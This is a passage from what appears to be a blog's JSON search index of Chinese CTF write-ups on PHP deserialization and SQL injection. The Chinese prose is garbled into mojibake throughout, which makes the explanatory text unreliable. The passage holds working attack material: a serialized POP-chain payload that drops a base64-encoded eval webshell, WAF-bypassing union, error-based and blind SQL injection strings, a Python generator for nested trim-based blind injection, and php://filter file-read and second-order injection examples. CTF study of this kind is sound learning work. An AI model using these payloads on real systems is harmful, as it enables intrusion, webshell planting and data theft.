å…¥çš„å€¼ï¼Œå¯ä»¥å‘ç°æœ€ç»ˆä¼ å…¥çš„å€¼ä¸ºç¬¬ä¸€ä¸ªæ•°ç»„çš„é”®å€¼ï¼Œä»¥åŠåµŒå¥—åçš„æ•°ç»„çš„é”®å€¼æ‹¼æ¥ä»¥åå³å˜æˆï¼Œå› ä¸ºæ¥ä¸‹æ¥ç”±äºæˆ‘ä»¬ä½¿ç”¨çš„ä¼ªåè®®çš„decodeæ‰“å¼€ï¼Œæ‰€ä»¥å‰é¢è¿™äº›å°†è¢«base64è§£å¯†å›å»ï¼Œå˜æˆä¹±ç  exitå°±æ¶ˆå¤±äº† phpexit111 è¿™é‡Œæ˜¯ä¸€å¥è¯æœ¨é©¬ æ¥ä¸‹æ¥å†™ä¸€ä¸‹popé“¾ï¼š &lt;?phpclass A{ public $store; public $key=&quot;a.php&quot;; public $expire; public $cache; public $complete; public function __construct($store) { $this-&gt;store=$store; }}class B{ public $options;}$b=new B();$b-&gt;options=array('data_compress'=&gt;0,'expire'=&gt;0,'serialize'=&gt;'strval','prefix'=&gt;'php://filter/write=convert.base64-decode/resource=./uploads/');$a=new A($b);$a-&gt;cache=array(111=&gt;array('path'=&gt;&quot;PD9waHAgZXZhbCgkX1BPU1RbJ2NtZCddKTs/PmFhYWFh&quot;));$a-&gt;complete=1;$a-&gt;key='shell.php';$a-&gt;expire=null;echo urlencode(serialize($a)); å°ç»“ï¼šè¿™é“é¢˜çš„å‘ç‚¹è¿˜æŒºå¤šçš„1.å­˜åœ¨è®¸å¤šå¯èƒ½æ”¹å˜dataçš„å‡½æ•°ï¼Œä½†æ˜¯éƒ½å¯ä»¥ç»•è¿‡2.ä¼ å…¥çš„æ•°ç»„éœ€è¦ä¸ºåŒé‡æ•°ç»„ï¼Œå…·ä½“æ˜¯ä¸ºä»€ä¹ˆå¯ä»¥åœ¨phpstormä¸­è°ƒè¯•ä¸€ä¸‹ï¼Œå¹¶ä¸”æˆ‘ä»¬çš„å†…å®¹çš„é”®åè¿˜å¿…é¡»æ˜¯ä»–è¦æ±‚çš„é‚£å‡ ä¸ªæ‰ä¼šè¢«è¯†åˆ«è¿›å…¥content3.exitçš„ç»•è¿‡éœ€è¦äº†è§£base64çš„åŠ å¯†æ–¹å¼ï¼Œç„¶ååé¢çš„payloadï¼Œåœ¨æˆ‘ä»¬ä¼ å…¥çš„æ—¶å€™åé¢éœ€è¦å†æ·»åŠ å‡ ä¸ªå­—æ¯æ¥è¡¥é½ï¼Œé˜²æ­¢å‰é¢çš„å†…å®¹åœ¨è§£å¯†çš„æ—¶å€™è¢«åƒæ‰","link":"/2021/07/27/buu25/"},{"title":"sqlç›²æ³¨æ·±å…¥å­¦ä¹ ","text":"sqlæ³¨å…¥è¯­å¥æ•´ç†è¿™é‡Œæ•´ç†ä¸€ä¸‹ç»•è¿‡äº†å¤§éƒ¨åˆ†wafçš„è¯­å¥ unionè”åˆæ³¨å…¥:è¿‡æ»¤äº†ç©ºæ ¼-1'union/*a*/select/*a*/1,group_concat(table_name),3/*a*/from/*a*/information_schema.tables/*a*/where/*a*/table_schema=database()--+-1'union/*a*/select/*a*/1,group_concat(column_name),3/*a*/from/*a*/information_schema.columns/*a*/where/*a*/table_name='fl4g'--+-1'union/*a*/select/*a*/1,fllllag,3/*a*/from/*a*/fl4g--+ è¿‡æ»¤äº†tableè¡¨-1'union/*a*/select/*a*/1,group_concat(table_name),3/*a*/from/*a*/sys.schema_auto_increment_columns/**/where/**/tabe_schema=database()--+-1'union/*a*/select/*a*/1,group_concat(table_name),3/**/from/*a*/mysql.innodb_table_stats/*a*/where/*a*/database_name=database()--+-1'union/*a*/select/*a*/1,fllllag,3/*a*/from/*a*/fl4g--+ æŠ¥é”™æ³¨å…¥1'and/**/extractvalue('~',concat('~',database()))--+1'and/**/extractvalue('~',concat('~',(select group_concat(table_name) from information_schema.tables where table_schema=database())))--+1'and/**/extractvalue('~',concat('~',(select group_concat(column_name) from information_schema.columns where table_name='users')))--+ sqlç›²æ³¨å­—ç¬¦ä¸²æˆªå–é—®é¢˜1.substr()/substring()è¯­æ³•ï¼šsubstr(str,pos)ï¼Œæˆªå–ä»posä½ç½®å¼€å§‹åˆ°æœ€åçš„æ‰€æœ‰strå­—ç¬¦ä¸² â€‹ substr(strï¼Œpos,len)â€‹ substr(str from pos for len)â€‹ substr(str from pos) ä¸¤ç§ç­‰ä»·å½¢å¼ï¼š 2.mid()sql mid()å‡½æ•°ç”¨é‡å¾—åˆ°ä¸€ä¸ªå­—ç¬¦ä¸²çš„ä¸€éƒ¨åˆ†ï¼Œè¿™ä¸ªå‡½æ•°è¢«MYSQLæ”¯æŒï¼Œä½†ä¸è¢«MS SQL Server å’ŒOracleæ”¯æŒã€‚åœ¨SQL Serverã€Oracleæ•°æ®åº“ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨SQLsubstringæˆ–è€…sql substrå‡½æ•°ä½œä¸ºæ›¿ä»£åœ¨mysqlä¸­å’ŒsubstråŸºæœ¬ä¸€æ ·midå¿…é¡»è¦ä¸‰ä¸ªå‚æ•° 3.right+asciiè¯­æ³•ï¼šascii(right(str,pos)) 4.left+reverse+asciileftåªèƒ½æ˜¾ç¤ºç¬¬ä¸€ä¸ªå­—ç¬¦çš„asciiç ï¼Œæ‰€ä»¥æ¯æ¬¡æˆªå–æ–°çš„å‡ºæ¥éƒ½éœ€è¦ç”¨reverseç¿»è½¬æ›´æ–°è¯¥asciiç  æ¯”è¾ƒé—®é¢˜1.ç­‰äº2.å¤§äºå°äº3.likesqlä¸­likeè‡ªå±…ä½¿ç”¨ç™¾åˆ†å·%å­—ç¬¦æ¥è¡¨ç¤ºä»»æ„å­—ç¬¦ï¼Œç±»ä¼¼äºunixæˆ–æ­£åˆ™è¡¨è¾¾å¼ä¸­çš„æ˜Ÿå·*ã€‚å¦‚æœæ²¡æœ‰ä½¿ç”¨ç™¾åˆ†å·%,likeå­—å¥ä¸ç­‰å·=çš„æ•ˆæœæ˜¯ä¸€æ ·çš„ 4.æ­£åˆ™è¡¨è¾¾å¼regexp rlikeè¯­æ³•ï¼šregexp &quot;^str&quot; regexpå’Œrlikeæ˜¯ä¸åŒºåˆ†å¤§å°å†™çš„ï¼Œéœ€è¦å¤§å°å†™æ•æ„Ÿè¦åŠ ä¸Šbinaryå…³é”®å­— 5.between 6.in ä¹Ÿæ˜¯å¤§å°å†™ä¸æ•æ„Ÿï¼Œå­—ç¬¦å’Œæ•°å­—éƒ½å¯ç”¨ï¼Œä¹Ÿæœ‰not in 7.ANDé€»è¾‘ä¸è¿ç®—ç¬¦1å’ŒçœŸä¸è¿˜æ˜¯çœŸä¸‹é¢çš„é€»è¾‘è¿ç®—çš„éƒ½ä¸€æ · 8.æ¯”è¾ƒ oré€»è¾‘è¿ç®—ç¬¦9.å¼‚æˆ–è¿ç®—ç¬¦10.order byæ¯”è¾ƒç›²æ³¨è¯­å¥ï¼šselect x union select yzk order by 1; å¦‚æœx&lt;yé‚£ä¹ˆæ’åºçš„ç¬¬ä¸€ä¸ªä¼šæ˜¯xï¼Œå¦‚æœx&gt;yé‚£ä¹ˆæ’åºç¬¬ä¸€ä¸ªæ˜¯yï¼Œæ›´æ”¹çš„é‚£ä¸€ç¬é—´å°±ä¼šå‘ç”Ÿæ”¹å˜ï¼Œ å›¾ä¸­è¡¨ç®­å¤´çš„æ˜¯å¯ä»¥ä¿®æ”¹çš„å¯ä»¥å‘ç°å¸ƒå°”å€¼æ›´æ”¹çš„å‰ä¸€ä¸ªå°±æ˜¯çœŸçš„ 11.casecase exp1 when exp2 then exp3 else exp4 end; è¿™ä¸ªè¯­å¥çš„æ„æ€æ˜¯ï¼šif exp1==exp2: return exp3else return exp4 12.if13.trim()trim():åˆ é™¤å‰åç©ºæ ¼ã€rtrim():åˆ é™¤å­—ç¬¦ä¸²ç»“å°¾ç©ºæ ¼ã€ltrim():åˆ é™¤å­—ç¬¦ä¸²èµ·å§‹ç©ºæ ¼è¯­æ³•ï¼štrim(both/leading/tring ç›®æ ‡å­—ç¬¦ä¸² from æºå­—ç¬¦ä¸²) åˆ©ç”¨ï¼šå¯ä»¥å‘ç°æœ‰ä¸ä¸€æ ·çš„å›æ˜¾ å†™æˆæ¯”è¾ƒè¯­å¥å¦‚ä¸‹ï¼š å¦‚æœ=å·ç”¨regexpæ›¿ä»£ é‚£ä¹ˆæ­£ç¡®çš„å­—ç¬¦ä¸€å®šåœ¨regexpå‰é¢ æ‰€ä»¥åº”è¯¥æ˜¯æ­£ç¡®çš„é‚£ä¸ªåœ¨åé¢ 14.insert()insert(å­—ç¬¦ä¸²ï¼Œèµ·å§‹é•¿åº¦ï¼Œé•¿åº¦ï¼Œæ›¿æ¢ä¸ºä»€ä¹ˆ) è¿™æ ·å°±å¯ä»¥æŒ‰ä½æˆªå–å­—ç¬¦ -1'/**/group/**/by/**/23,' -1'/**/union/**/select/**/1,(select/**/group_concat(table_name)/**/from/**/mysql.innodb_table_stats/**/where/**/database_name=database()),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,'22 -1'/**/union/**/select/**/1,(select/**/group_concat(a)/**/from(select/**/1,2/**/as/**/a,3/**/as/**/b/**/union/**/select*from/**/users)x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22' -1'/**/union/**/select/**/1,(select/**/group_concat(b)/**/from(select/**/1,2/**/as/**/a,3/**/as/**/b/**/union/**/select*from/**/users)x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22'","link":"/2021/07/29/sql%E7%9B%B2%E6%B3%A8%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0/"},{"title":"2021-hf-hatenumå¤ç°","text":"å‰è¨€ä»Šå¤©ä¸»è¦è·Ÿç€YINGå¸ˆçˆ¶çš„wpå­¦ä¹ ä¸€ä¸‹å…¶ä¸­çš„çŸ¥è¯†ç‚¹~ åˆ†ææºç åœ¨loginå‡½æ•°ä¸­çœ‹åˆ°ï¼Œæœ‰ä¸‰ç§å›æ˜¾ï¼Œä¸€ç§æ˜¯æˆåŠŸï¼Œå¦å¤–ä¸€ä¸ªæ˜¯errorè¿˜æœ‰ä¸€ä¸ªæ˜¯failï¼Œæ‰€ä»¥æˆ‘ä»¬åº”è¯¥æ„é€ ä¸€ä¸ªè¯­å¥ï¼Œå¯ä»¥æœ‰å›æ˜¾errorè¿˜æœ‰failï¼Œé‚£ä¹ˆå°±æ˜¯ä¸€ä¸ªè¦æŠ¥é”™ä¸€ä¸ªè¦false function login($username,$password,$code){ $res = $this-&gt;conn-&gt;query(&quot;select * from users where username='$username' and password='$password'&quot;); if($this-&gt;conn-&gt;error){ return 'error'; } else{ $content = $res-&gt;fetch_array(); if($content['code']===$_POST['code']){ $_SESSION['username'] = $content['username']; return 'success'; } else{ return 'fail'; } } }} è¿™é‡Œè¿‡æ»¤äº†ä¸€ç³»åˆ—å­—ç¬¦,åŒ…æ‹¬unionï¼Œselectï¼Œè¿™é‡Œæœ€ç³Ÿç³•çš„æ˜¯ä»–è¿‡æ»¤äº†å•å¼•å·ï¼Œå› ä¸ºæˆ‘ä»¬é€šå¸¸æ˜¯é‡‡ç”¨å•å¼•å·æ¥é—­åˆè¯­å¥çš„ function sql_waf($str){ if(preg_match('/union|select|or|and|\\'|&quot;|sleep|benchmark|regexp|repeat|get_lock|count|=|&gt;|&lt;| |\\*|,|;|\\r|\\n|\\t|substr|right|left|mid/i', $str)){ die('Hack detected'); }} è¿˜æœ‰ä¸€ä¸ªå­—ç¬¦æ•°ç›®é™åˆ¶ï¼Œé™åˆ¶å­—ç¬¦é•¿åº¦åœ¨9ä¸ªä»¥å†… function num_waf($str){ if(preg_match('/\\d{9}|0x[0-9a-f]{9}/i',$str)){ die('Huge num detected'); }} å¼•å·ç»•è¿‡ç”±äºæœ¬é¢˜åªéœ€è¦ç™»å½•å³å¯ï¼Œæ‰€ä»¥æˆ‘ä»¬åªè¦è·å–å¯†ç å°±è¡Œäº†ï¼Œé‚£ä¹ˆå°±å¯ä»¥åˆ©ç”¨æºç é‡Œé¢è‡ªå¸¦çš„æŸ¥è¯¢è¯­å¥ï¼Œè¿™æ ·æ²¡æœ‰selectä¹Ÿæ²¡å…³ç³»ï¼Œä½†æ˜¯å¼•å·å¦‚ä½•é—­åˆç»•è¿‡å‘¢ï¼ŸæŸ¥è¯¢è¯­å¥æ˜¯è¿™æ ·çš„ï¼šé‚£æˆ‘ä»¬åªéœ€è¦åœ¨ç¬¬äºŒä¸ªå¼•å·çš„ä½ç½®åŠ ä¸€ä¸‹åæ–œæ å°†å®ƒè½¬ä¹‰ï¼Œç„¶åå°†æˆ‘ä»¬è¦æ³¨å…¥çš„å†…å®¹æ”¾åœ¨passwordå­—æ®µ &quot;select * from users where username='$username' and password='$password'&quot; æ‰€ä»¥å°±å¦‚ä¸‹ï¼š &quot;select * from users where username='$username\\' and password='||`username`='admin'åé¢å†åŠ ä¸Šä½ çš„æ³¨å…¥è¯­å¥#&quot; å¸ƒå°”ç›²æ³¨è¯­å¥æ„é€ æ¡ä»¶è¯­å¥çš„é€‰å–ï¼šç”±äºæ¯”è¾ƒç¬¦å·éƒ½è¢«è¿‡æ»¤äº†ï¼Œå¦‚æœä½¿ç”¨ifæ˜¾ç„¶æ˜¯ä¸å¤Ÿçš„ï¼Œè¿™é‡Œæˆ‘ä»¬ä½¿ç”¨case whenåˆæ­¥è¯­å¥æ„é€ ä¸ºï¼š case '' when '' then '' else '' end# åé¢thenå’Œelseä¸€ä¸ªå‘æŠ¥é”™çš„ä¸€ä¸ªæ”¾æŸ¥è¯¢é”™è¯¯çš„ æŠ¥é”™å‡½æ•°é€‰å–æŠ¥é”™å‡½æ•°å¯ä»¥ç”¨cot(0)æˆ–è€…exp(9999999999999999)éƒ½æ˜¯ä¸‰è§’å‡½æ•° æˆªå–å‡½æ•°é€‰æ‹©ç”±äºè¿™é‡Œå°†substrç­‰æˆªå–å‡½æ•°éƒ½è¿‡æ»¤äº†ï¼Œæ‰€ä»¥é€‰æ‹©trim()å‡½æ•° trim(leading''from'')rlike(trim(leading''from'')) è¿™ä¸ªè¯­å¥æˆ‘ä»¬åœ¨mysqlä¸­æµ‹è¯•ä¸€ä¸‹å°†ä¼šæ›´ç›´è§‚ä¸€äº›ï¼š trim(leading('a')from(`password`)) rlike trim(leading('b')from(`password`)) å’Œæ¡ä»¶è¯­å¥ç»„åˆåå³ä¸ºï¼šä»¥ä¸‹è¯­å¥çš„æ„æ€å³ä¸ºå¦‚æœä¸¤ä¸ªtrimçš„ç»“æœå¦‚æœä¸€è‡´åˆ™ä¸º1 é‚£ä¹ˆå°±ä¸æ˜¯0 é‚£ä¹ˆå°±ä¼šè¿”å›1ï¼Œå¦‚æœä¸¤ä¸ªtrimçš„ç»“æœä¸ä¸€è‡´ï¼Œé‚£ä¹ˆå°±ä¼šè¿”å›0å°±ä¼šè¿”å›cot(0) case trim(leading 'a' from `password`) rlike trim(leading 'b' from `password`) when 0 then cot(0) else 1 end å¯ä»¥å‘ç°å¦‚æœæˆªå–åˆ°å¯†ç çš„å­—ç¬¦ï¼Œé‚£ä¹ˆå°±ä¼šè¿”å›é”™è¯¯ï¼Œå¦åˆ™å°±ä¼šè¿”å›è¡¨ï¼ŒæŸ¥è¯¢ç»“æœå³ä¸ºfalse é•¿åº¦ç»•è¿‡ï¼šç”±äºæˆ‘ä»¬ä¸èƒ½è¾“å…¥å¼•å·ï¼Œæ‰€ä»¥è¯´å­—ç¬¦ä¸²éƒ½éœ€è¦è½¬ä¸ºåå…­è¿›åˆ¶è¿›è¡Œè¾“å…¥ï¼Œä½†æ˜¯è½¬ä¸ºåå…­è¿›åˆ¶çš„åŠ¿å¿…ä¼šè¶…è¿‡9ä½æ•°ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥åˆ©ç”¨hexå’Œunhexå‡½æ•°ç¼©çŸ­é•¿åº¦ï¼šå…ˆç”¨åè¿›åˆ¶è¡¨ç¤ºè½¬ä¸ºåå…­è¿›åˆ¶çš„å­—ç¬¦ä¸²ï¼Œé‚£ä¹ˆæ­¤æ—¶ æˆ‘ä»¬å°±å¯ä»¥ç”¨è¿ç®—ç¬¦ä»¥åŠç§‘å­¦æŠ€æœ¯æ³•ï¼Œé‚£ä¹ˆä½æ•°å°†ä¼šå‡å°‘å¾ˆå¤šäº†ï¼Œæœ€åå†å°†ç»“æœè½¬ä¸ºåå…­è¿›åˆ¶å³å¯ select admin;select unhex(hex(4182e8+96719726e0)); ä½†æ˜¯å­—ç¬¦å–åˆ°åé¢è¿˜æ˜¯ä¼šè¶…è¿‡9ä½ï¼Œæ­¤æ—¶éœ€è¦å¦ä¸€ç§æ–¹æ³•æ¥æˆªå–ï¼Œé‚£å°±æ˜¯ä½¿ç”¨å‡½æ•°åµŒå¥—,æˆ‘ä»¬çš„é—®é¢˜åœ¨äºï¼Œåˆ°åé¢è¿‡å¤šçš„å–å­—ç¬¦ä»¥åæ¯”å¦‚è¯´å¯†ç ä¸ºabcï¼Œå–äº†abcï¼Œé‚£ä¹ˆä»–ä»¬å³ä½¿è½¬ä¸ºåè¿›åˆ¶+ç§‘å­¦è®¡æ•°æ³•+è¿ç®—ç¬¦ï¼Œä¹Ÿè¿˜æ˜¯ä¼šè¶…è¿‡9ä½ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦ä½¿ç”¨åµŒå¥—ï¼Œä¸€éƒ¨åˆ†ä¸€éƒ¨åˆ†çš„å–ï¼Œå¦‚ä¸‹ def recursion_g_code(l:list): def g_code(prefix, code): return f&quot;trim(leading({wrap_str(prefix)})from({code}))&quot; code = &quot;'code'&quot; for i in l: code = f'''g_code(&quot;{i}&quot;, {code})''' return eval(code) è„šæœ¬æˆ‘è‡ªå·±è‚¯å®šå†™ä¸å‡ºæ¥è¿™ä¹ˆå‰å®³çš„è„šæœ¬ã€‚ã€‚ã€‚ä»£ç ç¼–å†™èƒ½åŠ›è¿˜æ˜¯å¤ªå·®ï¼Œæ‰€ä»¥å°±ä»¿ç…§ä¸€ä¸‹è‡ªå·±ç†è§£çš„ç¼–å†™ä¸€ä¸‹ï¼šé¦–å…ˆæ˜¯ç¬¬ä¸€æ®µå­—ç¬¦ä¸²è½¬æ•°å­—ï¼šé€šè¿‡æ¯æ¬¡å–ä½™å…«ä½ï¼Œå°†åé¢çš„æ•°å­—å†…å®¹å…ˆæˆªå–å‡ºæ¥ï¼Œç„¶åè½¬å˜ä¸ºç§‘å­¦è®¡æ•°æ³•ï¼Œç„¶åå†å°†å‰©ä¸‹çš„æ•°å­—ä»¥ç§‘å­¦è®¡æ•°æ³•è¡¨ç¤º import requests as reqimport stringfrom Crypto.Util.number import bytes_to_long#ä»cryptoä¸­å¯¼å…¥bytes_to_longå‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°å¯ä»¥å°†å­—ç¬¦ä¸²è½¬ä¸ºé•¿æ•´æ•°url=&quot;&quot;&quot;å­—ç¬¦ä¸²è½¬unhex(hex())&quot;def wrap_str(s:str): def split_num(num:int): p=8 m=pow(10,p) parts=[] i=0 while num &gt;0: parts.insert(0,f&quot;{num % m}e{i}&quot;)#insertå‡½æ•°æ˜¯å¯¹listè¿›è¡Œæ“ä½œï¼Œè¡¨ç¤ºï¼Œç¬¬ä¸€ä¸ªæ•°å­—è¡¨ç¤ºæ“ä½œçš„ä½ç½®ï¼Œç¬¬äºŒä¸ªè¡¨ç¤ºæ’å…¥çš„å†…å®¹ i+=p num = num // m if i &gt;=100: raise RuntimeError(&quot;todo&quot;) return &quot;+&quot;.join(parts) s=s.encode() return f&quot;unhex(hex({split_num(bytes_to_long(s))}))&quot; ç¬¬äºŒæ®µ trimçš„å¥—å¨ƒ def recursion_g_code(l:list): def g_code(prefix, code): return f&quot;trim(leading({wrap_str(prefix)})from({code}))&quot; code = &quot;'code'&quot; for i in l: code = f'''g_code(&quot;{i}&quot;, {code})''' return eval(code) trim(leading(unhex(hex(5033e8+70115431e0)))from(trim(leading(unhex(hex(30057e0)))from(trim(leading(unhex(hex(12851e0)))from(trim(leading(unhex(hex(26472e0)))from(trim(leading(unhex(hex(30073e0)))from(trim(leading(unhex(hex(26674e0)))from(trim(leading(unhex(hex(26983e0)))from(trim(leading(unhex(hex(29301e0)))from(trim(leading(unhex(hex(26472e0)))from(trim(leading(unhex(hex(25970e0)))from(code))))))))))))))))))))rlike(trim(leading(unhex(hex(5033e8+70115432e0)))from(trim(leading(unhex(hex(30057e0)))from(trim(leading(unhex(hex(12851e0)))from(trim(leading(unhex(hex(26472e0)))from(trim(leading(unhex(hex(30073e0)))from(trim(leading(unhex(hex(26674e0)))from(trim(leading(unhex(hex(26983e0)))from(trim(leading(unhex(hex(29301e0)))from(trim(leading(unhex(hex(26472e0)))from(trim(leading(unhex(hex(25970e0)))from(code))))))))))))))))))))) å¯ä»¥çœ‹åˆ°åˆ†åˆ«æ˜¯å¯¹è¿™ä¸‰ä¸ªéƒ¨åˆ†è¿›è¡Œé€’å½’åµŒå¥— çŸ¥è¯†ç‚¹å°ç»“ï¼š1.å¼•å·ç»•è¿‡ï¼Œä¸¤ä¸ªå‚æ•°å‡å¯æ§çš„æƒ…å†µä¸‹2.case when else end3.trimå‡½æ•°æˆªå–4.å­—ç¬¦ä¸²è½¬åŒ–ä¸ºå¤§æ•°åŒ–çŸ­5.è®°ä¸€ç‚¹å°å‘ï¼Œå°±æ˜¯åœ¨postè¯·æ±‚çš„æ—¶å€™éœ€è¦allow_redirects=Falseï¼Œå¦åˆ™çš„è¯æ— æ³•æ¥æ”¶åˆ°æ­£ç¡®çš„æŠ¥æ–‡ï¼ŒåŸå› æ˜¯æºç ä¸­åœ¨postè¯·æ±‚åä¼šæœ‰header(location)è¿›è¡Œé‡å®šå‘","link":"/2021/08/02/2021-hf-hatenum%E5%A4%8D%E7%8E%B0/"},{"title":"buu26","text":"[b01lers2020]Life on MarsburpæŠ“åŒ…ï¼Œå‘ç°æœ‰å‚æ•°ï¼Œå°è¯•ä¸€ä¸‹sqlæ³¨å…¥ï¼Œå‘ç°ä¸ºæ•°å­—å‹æ³¨å…¥ï¼Œä½¿ç”¨unionè”åˆæ³¨å…¥ï¼Œå­—æ®µæ•°ä¸º2ï¼Œå¹¶ä¸”å›æ˜¾åœ¨æœ€åä¸€ä¸ªä½ç½® æ¥ä¸‹æ¥å°±å¼€å§‹ amazonis_planitia%20union%20select%201,group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema='aliens'--+ å‘ç°è¡¨éƒ½æ˜¯ä¸€æ ·çš„ï¼Œæ„Ÿè§‰æœ‰ç‚¹å¥‡æ€ªï¼Œäºæ˜¯å†å›å»çœ‹çœ‹æœ‰æ²¡æœ‰å…¶ä»–åº“ï¼Œä½†æ˜¯ç¡®å®åªæœ‰ä¸€ä¸ªåº“ï¼Œçœ‹äº†ä¸€ä¸‹wpå‘ç°æ˜¯è¦ç”¨sqlmapè·‘ä¸€ä¸‹ï¼Œæœ‰ä¸€ä¸ªcodeåº“ ç„¶åæ‰‹å·¥æ³¨å…¥ä¸€ä¸‹ï¼š search=amazonis_planitia union select group_concat(id),group_concat(code) from alien_code.code--+ [GXYCTF2019]BabysqliV3.0æŸ¥çœ‹æºç ï¼Œå‘ç°ä¸€ä¸ªUnicodeï¼Œè§£ç ä»¥åæ˜¯ä¸€ä¸ªä¸€å¼€å§‹æ²¡ååº”è¿‡æ¥ï¼Œåæ¥æƒ³æƒ³ï¼Œå®ƒçš„æ„æ€åº”è¯¥æ˜¯æç¤ºè¿™æ˜¯ä¸€ä¸ªå¼±å£ä»¤è·‘äº†ä¸€ä¸‹å‘ç°admin/passwordå¯ä»¥ç™»å½•ç™»é™†ä»¥åå‘ç°æœ‰æ–‡ä»¶åŒ…å«ï¼Œç”¨ä¼ªåè®®å°è¯•è¯»ä¸€ä¸‹æºç è¯•è¯•çœ‹ ?file=php://filter/read=convert.base64-encode/resource=home &lt;?phpsession_start();echo &quot;&lt;meta http-equiv=\\&quot;Content-Type\\&quot; content=\\&quot;text/html; charset=utf-8\\&quot; /&gt; &lt;title&gt;Home&lt;/title&gt;&quot;;error_reporting(0);if(isset($_SESSION['user'])){ if(isset($_GET['file'])){ if(preg_match(&quot;/.?f.?l.?a.?g.?/i&quot;, $_GET['file'])){ die(&quot;hacker!&quot;); } else{ if(preg_match(&quot;/home$/i&quot;, $_GET['file']) or preg_match(&quot;/upload$/i&quot;, $_GET['file'])){ $file = $_GET['file'].&quot;.php&quot;; } else{ $file = $_GET['file'].&quot;.fxxkyou!&quot;; } echo &quot;Ã¥Â½Â“Ã¥Â‰ÂÃ¥Â¼Â•Ã§Â”Â¨Ã§ÂšÂ„Ã¦Â˜Â¯ &quot;.$file; require $file; } } else{ die(&quot;no permission!&quot;); }}?&gt; æ ¹æ®è¿‡æ»¤å†…å®¹ï¼Œåº”è¯¥æ˜¯æœ‰ä¸€ä¸ªåä¸ºflagçš„æ–‡ä»¶å¤¹å­˜å‚¨ç€flagå†æ¥è¯»ä¸€ä¸‹upload.phpçš„æ–‡ä»¶å†…0å®¹ &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt; &lt;form action=&quot;&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt; Ã¤Â¸ÂŠÃ¤Â¼ Ã¦Â–Â‡Ã¤Â»Â¶ &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt; &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Ã¤Â¸ÂŠÃ¤Â¼ &quot; /&gt;&lt;/form&gt;&lt;?phperror_reporting(0);class Uploader{ public $Filename; public $cmd; public $token; function __construct(){ $sandbox = getcwd().&quot;/uploads/&quot;.md5($_SESSION['user']).&quot;/&quot;; $ext = &quot;.txt&quot;; @mkdir($sandbox, 0777, true); if(isset($_GET['name']) and !preg_match(&quot;/data:\\/\\/ | filter:\\/\\/ | php:\\/\\/ | \\./i&quot;, $_GET['name'])){ $this-&gt;Filename = $_GET['name']; } else{ $this-&gt;Filename = $sandbox.$_SESSION['user'].$ext; } $this-&gt;cmd = &quot;echo '&lt;br&gt;&lt;br&gt;Master, I want to study rizhan!&lt;br&gt;&lt;br&gt;';&quot;; $this-&gt;token = $_SESSION['user']; } function upload($file){ global $sandbox; global $ext; if(preg_match(&quot;[^a-z0-9]&quot;, $this-&gt;Filename)){ $this-&gt;cmd = &quot;die('illegal filename!');&quot;; } else{ if($file['size'] &gt; 1024){ $this-&gt;cmd = &quot;die('you are too big (Ã¢Â€Â²Ã¢Â–Â½`Ã£Â€Âƒ)');&quot;; } else{ $this-&gt;cmd = &quot;move_uploaded_file('&quot;.$file['tmp_name'].&quot;', '&quot; . $this-&gt;Filename . &quot;');&quot;; } } } function __toString(){ global $sandbox; global $ext; // return $sandbox.$this-&gt;Filename.$ext; return $this-&gt;Filename; } function __destruct(){ if($this-&gt;token != $_SESSION['user']){ $this-&gt;cmd = &quot;die('check token falied!');&quot;; } eval($this-&gt;cmd); }}if(isset($_FILES['file'])) { $uploader = new Uploader(); $uploader-&gt;upload($_FILES[&quot;file&quot;]); if(@file_get_contents($uploader)){ echo &quot;Ã¤Â¸Â‹Ã©ÂÂ¢Ã¦Â˜Â¯Ã¤Â½ Ã¤Â¸ÂŠÃ¤Â¼ Ã§ÂšÂ„Ã¦Â–Â‡Ã¤Â»Â¶Ã¯Â¼Âš&lt;br&gt;&quot;.$uploader.&quot;&lt;br&gt;&quot;; echo file_get_contents($uploader); }}?&gt; æ–‡ä»¶+åºåˆ—åŒ–ï¼Œå¹¶ä¸”æ²¡æœ‰ååºåˆ—åŒ–çš„ç‚¹ï¼Œé‚£ä¹ˆå°±æ˜¯pharååºåˆ—åŒ–","link":"/2021/07/30/buu26/"},{"title":"SQLäºŒæ¬¡æ³¨å…¥-GACTF-carefulleyes","text":"æºç å®¡è®¡é¦–å…ˆçœ‹çœ‹é¢˜ç›®çš„æºç ï¼Œrename.phpåœ¨è¿™é‡Œæ˜¯å­˜åœ¨äºŒæ¬¡æ³¨å…¥çš„ï¼Œæ–°çš„æ–‡ä»¶åä¼šæ›¿æ¢æ—§çš„æ–‡ä»¶åï¼Œæ–°æ–‡ä»¶ååˆå°†è¢«ç›´æ¥å–å‡º &lt;?phprequire_once &quot;common.php&quot;;if (isset($req['oldname']) &amp;&amp; isset($req['newname'])) { $result = $db-&gt;query(&quot;select * from `file` where `filename`='{$req['oldname']}'&quot;); if ($result-&gt;num_rows &gt; 0) { $result = $result-&gt;fetch_assoc(); $info = $db-&gt;query(&quot;select * from `file` where `filename`='{$result['filename']}'&quot;); $info = $info-&gt;fetch_assoc(); echo &quot;oldfilename : &quot;.$info['filename'].&quot; will be changed.&quot;; } else { exit(&quot;old file doesn't exists!&quot;); }} å¤§è‡´åˆ†æä¸€ä¸‹ï¼šå‡è®¾æˆ‘ä»¬è¾“å…¥çš„æ–‡ä»¶åä¸ºï¼š1'or 1=1#.jpgé‚£ä¹ˆæ’å…¥åˆ°æ•°æ®åº“å½“ä¸­ä»¥åå°†å˜æˆ1'or 1=1#é‚£ä¹ˆåé¢å–å‡ºæ•°æ®çš„æ—¶å€™ select * from `file` where `filename`='{$result['filename']}'select * from `file` where `filename`='1'or 1=1#' ä¸€å¼€å§‹æµ‹è¯•çš„æ—¶å€™ æˆ‘æ˜¯ç”¨andçš„ï¼Œä½†æ˜¯å½“æˆ‘æ”¹æˆ1â€™and 1=2çš„æ—¶å€™å›æ˜¾ç»“æœä¹Ÿæ˜¯ä¸€æ ·çš„ï¼Ÿ1'and 1=1# 